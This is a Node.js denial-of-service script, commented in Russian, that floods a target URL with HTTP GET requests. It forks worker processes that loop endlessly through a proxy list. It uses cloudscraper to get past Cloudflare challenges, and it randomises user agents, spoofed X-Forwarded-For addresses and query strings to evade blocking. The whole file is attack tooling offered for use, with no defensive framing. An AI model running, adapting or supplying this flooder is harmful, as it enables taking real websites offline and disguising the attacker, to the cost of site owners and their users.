require('events').EventEmitter.defaultMaxListeners = Infinity;
const cloudscraper = require('cloudscraper');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const userAgents = require('user-agents');
const cluster = require('cluster');
const axios = require('axios');
const http = require('http');
const https = require('https');

// Проверка аргументов
if (process.argv.length !== 7) {
    console.log(`
[!] Usage: node ${path.basename(__filename)} <URL> <TIME_SEC> <REQ_PER_THREAD> <PROXY_FILE> <THREADS>

Example: node ${path.basename(__filename)} https://example.com 60 250 proxies.txt 10
`);
    process.exit(1);
}

const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]) * 1000;
const REQUESTS_PER_THREAD = parseInt(process.argv[4]);
const PROXY_FILE = process.argv[5];
const THREADS = parseInt(process.argv[6]);

// Проверка файла прокси
if (!fs.existsSync(PROXY_FILE)) {
    console.error(`[X] Proxy file '${PROXY_FILE}' not found!`);
    process.exit(1);
}

let proxies = [];
try {
    proxies = fs.readFileSync(PROXY_FILE, 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p.length > 0 && p.includes(':'));
    
    if (proxies.length === 0) {
        throw new Error('No valid proxies in file');
    }
} catch (err) {
    console.error(`[X] Error reading proxies: ${err.message}`);
    process.exit(1);
}

// Генерация случайных данных
function randomString(length) {
    return crypto.randomBytes(Math.ceil(length/2))
        .toString('hex')
        .slice(0,length);
}

// Функция для создания агента с прокси
function createAgent(proxy) {
    const [host, port] = proxy.split(':');
    return new http.Agent({
        host: host,
        port: port,
        rejectUnauthorized: false,
        timeout: 5000
    });
}

// Основная функция атаки
async function attack() {
    while (true) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        try {
            const agent = createAgent(proxy);
            const userAgent = new userAgents().toString();
            const randomParam = randomString(8);
            
            const options = {
                url: `${TARGET}?${randomParam}=${randomString(16)}`,
                method: 'GET',
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
                },
                agent: agent,
                timeout: 8000,
                followAllRedirects: true,
                challengesToSolve: 3
            };

            await cloudscraper(options);
            console.log(`[+] Request sent via ${proxy}`);

            // Дополнительные запросы
            for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
                setTimeout(() => {
                    cloudscraper(options).catch(() => {});
                }, Math.floor(Math.random() * 400) + 100);
            }
        } catch (err) {
            console.error(`[-] Error via ${proxy}: ${err.message}`);
            continue;
        }
    }
}

// Запуск кластера
if (cluster.isMaster) {
    console.log(`
[!] Starting attack
[!] Target: ${TARGET}
[!] Threads: ${THREADS}
[!] Requests/thread: ${REQUESTS_PER_THREAD}
[!] Proxies loaded: ${proxies.length}
[!] Duration: ${DURATION/1000} seconds
`);

    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('[!] Attack finished');
        process.exit(0);
    }, DURATION);
} else {
    attack();
}

// Обработка ошибок
process.on('uncaughtException', (err) => {
    console.error(`[!] Uncaught exception: ${err.message}`);
});
process.on('unhandledRejection', (err) => {
    console.error(`[!] Unhandled rejection: ${err.message}`);
});
